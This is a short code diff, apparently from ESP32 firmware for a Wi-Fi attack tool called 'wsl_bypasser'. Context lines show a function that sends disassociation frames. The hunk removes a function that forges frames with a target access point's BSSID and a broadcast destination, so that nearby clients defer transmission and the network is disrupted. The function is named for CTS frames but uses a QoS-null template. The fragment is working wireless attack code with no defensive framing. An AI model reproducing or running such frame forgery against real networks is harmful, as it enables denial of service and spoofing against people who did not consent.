@@ -241,22 +241,4 @@ void wsl_bypasser_send_disassoc_frame(const wifi_ap_record_t *ap_record) {
     _tx_with_fallback(frame, sizeof(frame));
 }
 
-esp_err_t wsl_bypasser_send_cts_frame(const uint8_t *ap_bssid) {
-    if (!ap_bssid) return ESP_ERR_INVALID_ARG;
 
-    uint8_t frame[sizeof(qos_null_frame_template)];
-    memcpy(frame, qos_null_frame_template, sizeof(qos_null_frame_template));
-
-    /* Addr1 = DA = broadcast para todos no canal setarem NAV */
-    memset(&frame[4], 0xff, 6);
-    /* Addr2 = SA = BSSID do AP alvo (forjado — clientes reconhecem) */
-    memcpy(&frame[10], ap_bssid, 6);
-    /* Addr3 = BSSID do AP alvo */
-    memcpy(&frame[16], ap_bssid, 6);
-
-    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
-    if (ret != ESP_OK) {
-        ret = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
-    }
-    return ret;
-}
